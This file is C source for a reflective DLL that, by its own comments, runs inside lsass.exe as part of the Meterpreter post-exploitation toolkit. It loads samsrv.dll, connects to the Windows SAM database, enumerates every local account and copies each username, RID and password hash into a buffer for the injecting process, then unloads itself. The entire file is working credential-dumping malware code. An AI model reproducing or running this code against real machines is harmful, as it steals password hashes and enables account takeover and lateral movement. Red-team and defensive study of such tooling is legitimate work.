#include <stdlib.h>
#include <stdio.h>

#include "dump_sam.h"
#include "ReflectiveFreeAndExitThread.h"

#define RDIDLL_NOEXPORT
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#include "ReflectiveLoader.c"


/*! @brief Sets `dwResult` to the return value of `GetLastError()`, prints debug output, then does `break;` */
#define BREAK_ON_ERROR( str ) { dwResult = GetLastError(); dprintf( "%s. error=%d (0x%x)", str, dwResult, (ULONG_PTR)dwResult ); break; }
/*! @brief Sets `dwResult` to `error`, prints debug output, then `break;` */
#define BREAK_WITH_ERROR( str, err ) { dwResult = err; dprintf( "%s. error=%d (0x%x)", str, dwResult, (ULONG_PTR)dwResult ); break; }

/* Logging will work but only to OutputDebugStringA and not the full on Meterpreter logging because we don't have
 * access to the API from within lsass.exe (which is where we're running).
 */
#ifdef DEBUGTRACE
#define dprintf(...) real_dprintf(__VA_ARGS__)
#if DEBUGTRACE == 1
#define vdprintf dprintf
#else
#define vdprintf(...) do{}while(0);
#endif
#else
#define dprintf(...) do{}while(0);
#define vdprintf(...) do{}while(0);
#endif

/*!
 * @brief Output a debug string to the debug console.
 * @details The function emits debug strings via `OutputDebugStringA`, hence all messages can be viewed
 *          using Visual Studio's _Output_ window, _DebugView_ from _SysInternals_, or _Windbg_.
 */
static _inline void real_dprintf(char* format, ...)
{
	va_list args;
	char buffer[1024];
	size_t len;
	_snprintf_s(buffer, sizeof(buffer), sizeof(buffer) - 1, "[%04x] ", GetCurrentThreadId());
	len = strlen(buffer);
	va_start(args, format);
	vsnprintf_s(buffer + len, sizeof(buffer) - len, sizeof(buffer) - len - 3, format, args);
	strcat_s(buffer, sizeof(buffer), "\r\n");
	OutputDebugStringA(buffer);
	va_end(args);
}

/* Convert a wchar string to a mb string. Chars can be -1 if the string is NULL terminated, otherwise it needs to be the
 * number of wide characters in the string not including the NULL terminator. The return value is always NULL
 * terminated.
 */
char* wchar_to_utf8(const wchar_t* in, int chars)
{
	char* out;
	int len;
	HANDLE hHeap = GetProcessHeap();

	if (!in)
		return NULL;

	len = WideCharToMultiByte(CP_UTF8, 0, in, chars, NULL, 0, NULL, NULL);
	if (len <= 0)
		return NULL;

	/* if -1 was passed through to WideCharToMultiByte, there's no need to add for the NULL terminator */
	out = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (len * sizeof(char)) + (chars == -1 ? 0 : 1));
	if (!out)
		return NULL;

	if (WideCharToMultiByte(CP_UTF8, 0, in, chars, out, len, NULL, FALSE) == 0)
	{
		HeapFree(hHeap, 0, out);
		out = NULL;
	}

	return out;
}

/*!
 * @brief Function that is copied to lsass and run in a separate thread to dump hashes.
 * @param fargs Collection of arguments containing important information, handles and pointers.
 * @remark The code in this fuction _must_ be position-independent. No direct calls to functions
 *         are to be made.
 */
DWORD dump_sam(FUNCTIONARGS* fargs)
{
	/* variables for samsrv function pointers */
	HANDLE hSamSrv = NULL, hSam = NULL;
	SamIConnectType pSamIConnect;
	SamrOpenDomainType pSamrOpenDomain;
	SamrEnumerateUsersInDomainType pSamrEnumerateUsersInDomain;
	SamrOpenUserType pSamrOpenUser;
	SamrQueryInformationUserType pSamrQueryInformationUser;
	SamIFree_SAMPR_USER_INFO_BUFFERType pSamIFree_SAMPR_USER_INFO_BUFFER;
	SamIFree_SAMPR_ENUMERATION_BUFFERType pSamIFree_SAMPR_ENUMERATION_BUFFER;
	SamrCloseHandleType pSamrCloseHandle;

	/* variables for samsrv functions */
	HANDLE hEnumerationHandle = NULL, hDomain = NULL, hUser = NULL;
	SAM_DOMAIN_USER_ENUMERATION* pEnumeratedUsers = NULL;
	DWORD dwNumberOfUsers = 0;
	PVOID pvUserInfo = 0;

	/* variables for advapi32 functions */
	LSA_HANDLE hLSA = NULL;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes;
	POLICY_ACCOUNT_DOMAIN_INFO* pAcctDomainInfo = NULL;

	/* general variables */
	NTSTATUS status;
	HANDLE hReadLock = NULL, hFreeLock = NULL;
	DWORD dwUsernameLength = 0, dwCurrentUser = 0, dwStorageIndex = 0;
	DWORD dwResult = 0;
	NTSTATUS NtStatus = 0;
	HANDLE hHeap = GetProcessHeap();

	dprintf("[DUMPSAM] Starting dump");

	do {
		/* load samsrv functions */
		hSamSrv = LoadLibrary("samsrv.dll");
		if (!hSamSrv)
			BREAK_ON_ERROR("[DUMPSAM] Failed to load samsrv.dll");

		pSamIConnect = (SamIConnectType)GetProcAddress(hSamSrv, "SamIConnect");
		pSamrOpenDomain = (SamrOpenDomainType)GetProcAddress(hSamSrv, "SamrOpenDomain");
		pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainType)GetProcAddress(hSamSrv, "SamrEnumerateUsersInDomain");
		pSamrOpenUser = (SamrOpenUserType)GetProcAddress(hSamSrv, "SamrOpenUser");
		pSamrQueryInformationUser = (SamrQueryInformationUserType)GetProcAddress(hSamSrv, "SamrQueryInformationUser");
		pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERType)GetProcAddress(hSamSrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
		pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFERType)GetProcAddress(hSamSrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
		pSamrCloseHandle = (SamrCloseHandleType)GetProcAddress(hSamSrv, "SamrCloseHandle");

		if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain || !pSamrOpenUser || !pSamrQueryInformationUser ||
			!pSamIFree_SAMPR_USER_INFO_BUFFER || !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
		{
			BREAK_WITH_ERROR("[DUMPSAM] Failed to resolve all required functions", ERROR_NOT_FOUND);
		}

		/* initialize the LSA_OBJECT_ATTRIBUTES structure */
		ObjectAttributes.RootDirectory = NULL;
		ObjectAttributes.ObjectName = NULL;
		ObjectAttributes.Attributes = 0;
		ObjectAttributes.SecurityDescriptor = NULL;
		ObjectAttributes.SecurityQualityOfService = NULL;
		ObjectAttributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);

		/* open a handle to the LSA policy */
		if (NtStatus = LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_ALL_ACCESS, &hLSA) < 0)
			BREAK_WITH_ERROR("[DUMPSAM] Failed to open a handle to the LSA policy", LsaNtStatusToWinError(NtStatus));

		if (NtStatus = LsaQueryInformationPolicy(hLSA, PolicyAccountDomainInformation, (LPVOID*)&pAcctDomainInfo) < 0)
			BREAK_WITH_ERROR("[DUMPSAM] Failed to query the LSA policy information", LsaNtStatusToWinError(NtStatus));

		/* connect to the SAM database */
		if (pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1) < 0)
			BREAK_WITH_ERROR("[DUMPSAM] Failed to connect to the SAM database", ERROR_CAN_NOT_COMPLETE);

		if (pSamrOpenDomain(hSam, 0xf07ff, pAcctDomainInfo->DomainSid, &hDomain) < 0)
			BREAK_WITH_ERROR("[DUMPSAM] Failed to open the SAM domain", ERROR_CAN_NOT_COMPLETE);

		/* enumerate all users and store username, rid, and hashes */
		do
		{
			status = pSamrEnumerateUsersInDomain(hDomain, &hEnumerationHandle, 0, &pEnumeratedUsers, 0xFFFF, &dwNumberOfUsers);
			if (status < 0)
			{
				break;
			}	// error

			// 0x0 = no more, 0x105 = more users
			if (!dwNumberOfUsers)
			{
				break;
			}	// exit if no users remain

			if (fargs->dwDataSize == 0)
			{	// first allocation
				fargs->dwDataSize = dwNumberOfUsers * sizeof(USERNAMEHASH);
				fargs->UsernameHashData.ptr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fargs->dwDataSize);
			}
			else
			{	// subsequent allocations
				fargs->dwDataSize += dwNumberOfUsers * sizeof(USERNAMEHASH);
				fargs->UsernameHashData.ptr = HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, fargs->UsernameHashData.ptr, fargs->dwDataSize);
			}
			if (!fargs->UsernameHashData.ptr)
				BREAK_WITH_ERROR("[DUMPSAM] Failed to allocate memory", ERROR_NOT_ENOUGH_MEMORY);

			for (dwCurrentUser = 0; dwCurrentUser < dwNumberOfUsers; dwCurrentUser++)
			{

				if (pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId, &hUser) < 0)
					BREAK_WITH_ERROR("[DUMPSAM] Failed to open SAM user", ERROR_CAN_NOT_COMPLETE);

				if (pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pvUserInfo) < 0)
					BREAK_WITH_ERROR("[DUMPSAM] Failed to query user information", ERROR_CAN_NOT_COMPLETE);

				/* allocate space for another username */
				LSA_UNICODE_STRING wszUsername = pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername;
				(fargs->UsernameHashData.ptr)[dwStorageIndex].Username.ptr = wchar_to_utf8(wszUsername.Buffer, wszUsername.Length / sizeof(WCHAR));

				if ((fargs->UsernameHashData.ptr)[dwStorageIndex].Username.ptr == NULL)
					BREAK_WITH_ERROR("[DUMPSAM] Failed to encode the username", ERROR_CAN_NOT_COMPLETE);

				dwUsernameLength = (DWORD)strlen((fargs->UsernameHashData.ptr)[dwStorageIndex].Username.ptr);
				(fargs->UsernameHashData.ptr)[dwStorageIndex].Length = dwUsernameLength;
				(fargs->UsernameHashData.ptr)[dwStorageIndex].RID = pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId;
				memcpy((fargs->UsernameHashData.ptr)[dwStorageIndex].Hash, pvUserInfo, 32);

				/* clean up */
				pSamIFree_SAMPR_USER_INFO_BUFFER(pvUserInfo, SAM_USER_INFO_PASSWORD_OWFS);
				pSamrCloseHandle(&hUser);
				pvUserInfo = 0;
				hUser = 0;

				/* move to the next storage element */
				dwStorageIndex++;
			}
			pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnumeratedUsers);
			pEnumeratedUsers = NULL;

		} while (status == 0x105);

		/* set the event to signify that the data is ready */
		hReadLock = OpenEvent(EVENT_MODIFY_STATE, FALSE, fargs->ReadSyncEvent);
		if (hReadLock == NULL)
			BREAK_ON_ERROR("[DUMPSAM] Failed to open the read-lock event");

		/* wait for the copying to finish before freeing all the allocated memory */
		hFreeLock = OpenEvent(SYNCHRONIZE, FALSE, fargs->FreeSyncEvent);
		if (hFreeLock == NULL)
			BREAK_ON_ERROR("[DUMPSAM] Failed to open the free-lock event");

		if (SetEvent(hReadLock) == 0)
			BREAK_ON_ERROR("[DUMPSAM] Failed to set the read-lock event");

		dwResult = WaitForSingleObject(hFreeLock, fargs->dwMillisecondsToWait);
		if (dwResult != WAIT_OBJECT_0)
			BREAK_WITH_ERROR("[DUMPSAM] Failed to wait for the free-lock event to be signaled", dwResult);
	} while (FALSE);

	dprintf("[DUMPSAM] Cleaning up...");

	/* free all the allocated memory */
	for (dwCurrentUser = 0; dwCurrentUser < dwStorageIndex; dwCurrentUser++)
	{
		HeapFree(hHeap, 0, (fargs->UsernameHashData.ptr)[dwCurrentUser].Username.ptr);
	}
	HeapFree(hHeap, 0, fargs->UsernameHashData.ptr);

	/* close all handles */
	pSamrCloseHandle(&hDomain);
	pSamrCloseHandle(&hSam);
	LsaClose(hLSA);

	/* free library handles */
	if (hSamSrv)
	{
		FreeLibrary(hSamSrv);
	}

	/* signal that the memory deallocation is complete */
	SetEvent(hReadLock);
	CloseHandle(hReadLock);

	/* release the free handle */
	CloseHandle(hFreeLock);

	dprintf("[DUMPSAM] Finished with status: 0x%08x", dwResult);

	dprintf("[DUMPSAM] Calling ReflectiveFreeAndExitThread(0x%p, 0)", hAppInstance);
	ReflectiveFreeAndExitThread(hAppInstance, 0);

	/* should never reach this point */
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
			dump_sam((FUNCTIONARGS*)lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
